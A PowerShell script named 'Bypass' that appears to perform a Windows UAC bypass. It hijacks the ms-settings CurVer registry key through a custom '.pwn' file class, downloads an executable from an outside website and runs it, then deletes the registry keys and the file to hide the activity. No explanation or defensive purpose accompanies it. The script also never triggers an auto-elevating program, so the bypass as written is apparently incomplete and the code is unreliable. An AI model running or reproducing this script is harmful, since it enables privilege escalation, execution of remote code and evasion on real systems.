function Check-System {
    $osVersion = (Get-WmiObject -Class Win32_OperatingSystem).Version
    if ($osVersion -ge "10.0") {
        return $true
    } else {
        return $false
    }
}

function Bypass {
    if (-not (Check-System)) {
        $osName = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        Write-Error "Not applicable on $osName"
        return
    }

    try {
        # Create registry keys and set values
        New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force | Out-Null
        Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value "$env:TEMP\advbattoexeconverter.exe" -Force

        New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force | Out-Null
        Set-ItemProperty "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -Value ".pwn" -Force

        # Download and execute the executable file
        $downloadUri = "https://www.battoexeconverter.com/downloads/advbattoexeconverter.exe"
        $downloadPath = "$env:TEMP\advbattoexeconverter.exe"
        Invoke-WebRequest -Uri $downloadUri -OutFile $downloadPath
        Start-Process $downloadPath -Wait

        # Give it a few seconds to execute
        Start-Sleep 3
    }
    catch {
        Write-Error "An error occurred: $_"
    }
    finally {
        # Clean up the registry
        Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item "HKCU:\Software\Classes\.pwn\" -Recurse -Force -ErrorAction SilentlyContinue

        # Clean up the downloaded file
        Remove-Item $downloadPath -Force -ErrorAction SilentlyContinue
    }
}

# Run the function
Bypass
